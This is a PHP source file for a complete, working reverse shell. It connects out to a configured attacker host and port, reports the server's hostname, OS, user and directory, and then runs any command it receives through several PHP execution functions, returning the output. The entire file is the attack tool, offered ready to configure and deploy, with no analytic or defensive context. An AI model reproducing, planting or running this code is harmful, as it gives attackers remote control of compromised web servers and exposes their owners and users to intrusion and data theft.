<?php
/**
 * PHP Reverse Shell
 * Modern implementation with features
 * Configure LHOST and LPORT before use
 */

$LHOST = "192.168.1.100";
$LPORT = 4444;

function sendMessage($sock, $msg) {
    fwrite($sock, $msg . "\n");
}

function executeCommand($cmd) {
    $output = "";
    
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . " 2>&1");
    } elseif (function_exists('exec')) {
        exec($cmd . " 2>&1", $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    } else {
        $output = "No shell functions available";
    }
    
    return $output ?: "Command executed (no output)";
}

// Main
$sock = @fsockopen($LHOST, $LPORT, $errno, $errstr, 30);

if (!$sock) {
    die("Connection failed: $errstr ($errno)\n");
}

sendMessage($sock, "PHP Reverse Shell Connected!");
sendMessage($sock, "Host: " . php_uname('n'));
sendMessage($sock, "OS: " . PHP_OS);
sendMessage($sock, "User: " . get_current_user());
sendMessage($sock, "CWD: " . getcwd());

while (true) {
    fwrite($sock, "PHP > ");
    $cmd = trim(fgets($sock));
    
    if (empty($cmd)) continue;
    
    if ($cmd === "exit" || $cmd === "quit") {
        sendMessage($sock, "Goodbye!");
        break;
    }
    
    if (strpos($cmd, "cd ") === 0) {
        $dir = trim(substr($cmd, 3));
        if (@chdir($dir)) {
            sendMessage($sock, "Changed to: " . getcwd());
        } else {
            sendMessage($sock, "Error: Cannot change directory");
        }
        continue;
    }
    
    if ($cmd === "info") {
        $info = array(
            "php_version" => PHP_VERSION,
            "hostname" => php_uname('n'),
            "os" => PHP_OS,
            "user" => get_current_user(),
            "cwd" => getcwd(),
            "safe_mode" => ini_get('safe_mode') ? "ON" : "OFF"
        );
        sendMessage($sock, json_encode($info, JSON_PRETTY_PRINT));
        continue;
    }
    
    if ($cmd === "help") {
        sendMessage($sock, "Commands: exit, quit, cd, info, help");
        continue;
    }
    
    $output = executeCommand($cmd);
    sendMessage($sock, $output);
}

fclose($sock);
?>